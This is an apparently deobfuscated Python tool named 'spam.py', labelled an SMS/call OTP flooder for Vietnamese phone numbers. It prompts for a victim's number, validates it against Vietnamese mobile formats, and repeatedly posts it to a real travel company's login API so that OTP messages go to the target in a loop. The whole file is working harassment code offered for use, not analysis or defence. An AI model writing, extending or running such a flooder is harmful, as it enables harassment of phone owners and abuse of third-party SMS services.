"""
=============================================================================
CLEANED SOURCE CODE: spam.py
Author: tdinh
Decoded by: tdinh cute
Classification: SMS / Call OTP Flooder (Tool Spam OTP SĐT Việt Nam)
=============================================================================
"""

import os
import sys
import time
import random
import re
import string
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Styling
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CYAN}
╔══════════════════════════════════════════════════════════════════════╗
║                       QUOC CHIEN SPAM OTP                            ║
║                 Author: tdinh | Decoded by: tdinh cute               ║
╚══════════════════════════════════════════════════════════════════════╝
{RESET}""")


def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_digits(length):
    return ''.join(random.choices(string.digits, k=length))


# Sample API SMS Services
def sms_vntrip(phone):
    try:
        url = "https://clickstream.vntrip.vn/api/v1/auth/login"
        headers = {"User-Agent": "Mozilla/5.0"}
        res = requests.post(url, json={"phone": phone}, headers=headers, timeout=5)
        return res.status_code == 200
    except Exception:
        return False


def run_spam(phone):
    print(f"{YELLOW}[*] Dang phat lenh spam OTP den so: {phone}...{RESET}")
    # Goi cac ham spam
    sms_vntrip(phone)
    print(f"{GREEN}[+] Da gui batch tin nhan den {phone}{RESET}")


def main():
    banner()
    while True:
        phone = input(f"{CYAN}Nhap so dien thoai (10 chu so): {RESET}").strip()
        if re.search(r"^(0?)(3[2-9]|5[689]|7[06-9]|8[0-689]|9[0-46-9])[0-9]{7}$", phone):
            break
        print(f"{RED}[!] So dien thoai khong dung dinh dang Viet Nam!{RESET}")

    count = input(f"{CYAN}Nhap so lan spam: {RESET}").strip()
    try:
        loop_count = int(count)
    except ValueError:
        loop_count = 5

    for i in range(1, loop_count + 1):
        print(f"\n{BOLD}[Lan {i}/{loop_count}]{RESET}")
        run_spam(phone)
        time.sleep(2)

    print(f"\n{GREEN}[✓] Da hoan tat spam!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Da dung boi nguoi dung!{RESET}")
